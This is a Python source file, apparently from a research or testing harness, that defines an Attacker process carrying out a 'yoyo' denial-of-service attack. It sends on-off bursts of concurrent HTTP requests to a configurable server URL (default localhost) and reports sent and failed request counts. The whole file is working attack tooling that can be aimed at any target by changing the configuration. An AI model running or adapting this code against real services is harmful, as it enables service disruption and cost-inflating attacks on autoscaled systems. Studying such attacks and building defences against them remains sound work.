import asyncio
import time
from datetime import datetime
import aiohttp
from collections import OrderedDict
import multiprocessing as mp
from .reporter import Reporter


class Attacker(mp.Process):

    def __init__(self, config, start_attack_event, kill_event):
        super().__init__()
        self._threads = config.get("threads", 10)
        self._time_on = config.get("time_on", 10)
        self._time_off = config.get("time_off", 10)
        self._wait_between_requests = config.get("wait_between_requests", 0)
        self.logger = config.get("logger")
        self._report_queue = config.get("report_queue")
        self._start_attack_event = start_attack_event
        self._kill_event = kill_event
        self._request_config = config.get("request", {})
        self._server_dst = self._request_config.get("server_url", "http://localhost:8080")
        self._request_method = self._request_config.get("method", "get")
        self._request_headers = self._request_config.get("headers", {})
        self._request_data = self._request_config.get("data", {})
        self._loop = None
        self._sent_per_session = OrderedDict()
        self._failed_sent_per_session = OrderedDict()
        self._current_session_time = None
        self._kill = False

    @property
    def kill(self):
        return self._kill_event.is_set()

    @property
    def total_requests(self):
        return sum(self._sent_per_session.values())

    @property
    def total_fail_requests(self):
        return sum(self._failed_sent_per_session.values())

    def send_report(self, total_requests, total_fail_requests, num_sessions):
        report = Reporter(self.name, total_requests, total_fail_requests, num_sessions)
        self._report_queue.put(report)

    async def send_request(self, session):
        async with session.request(self._request_method, self._server_dst, headers=self._request_headers, json=self._request_data, timeout=200) as resp:
            status_code = resp.status
            self.logger.debug(status_code)
            if status_code != 200:
                self._failed_sent_per_session[self._current_session_time] += 1
            self._sent_per_session[self._current_session_time] += 1

    async def send_requests(self, max_time):
        st_time = time.time()
        end_time = st_time + max_time
        sess = aiohttp.ClientSession()
        tasks = []
        while time.time() < end_time and not self.kill:
            tasks.append(asyncio.create_task(self.send_request(sess)))
            await asyncio.sleep(self._wait_between_requests)
        num_of_remained_tasks = len(list(filter(lambda t: not t.done(), tasks)))
        self.logger.debug(f"Canceling remained tasks ({num_of_remained_tasks} tasks)..")
        list(map(lambda t: t.cancel(), tasks))
        # await asyncio.wait(tasks)
        # all_tasks_done = all(map(lambda t: t.done(), tasks))
        # self.logger.debug(f"All tasks done: {all_tasks_done}")
        tasks.append(asyncio.create_task(sess.close()))

    def attack_on(self):
        self._current_session_time = datetime.now().strftime('%H:%m:%S')
        self._sent_per_session[self._current_session_time] = 0
        self._failed_sent_per_session[self._current_session_time] = 0
        self.logger.debug(f"start time: {datetime.now().strftime('%H:%m:%S')}")
        asyncio.run(self.send_requests(self._time_on))

    def attack_off(self):
        st_time = time.time()
        end_time = st_time + self._time_off
        while time.time() < end_time and not self.kill:
            # So kill could be relatively quick
            time.sleep(0.1)

    def attack_session(self):
        self.attack_on()
        self.attack_off()
        self.logger.debug(f"Total requests in session: {self._sent_per_session[self._current_session_time]}")
        return self._sent_per_session[self._current_session_time]

    def yoyo_attack(self):
        self.logger.info("Starting yoyo attack..")
        self._loop = asyncio.get_event_loop()
        num_sessions = 0
        self._start_attack_event.wait()  # wait for all processes to start
        while not self.kill:
            self.attack_session()
            num_sessions += 1
        self._loop.close()
        self.logger.info("ending yoyo attack..")
        self.logger.debug(f"Total requests {self.total_requests}")
        self.send_report(self.total_requests, self.total_fail_requests, num_sessions)

    def run(self) -> None:
        self.yoyo_attack()
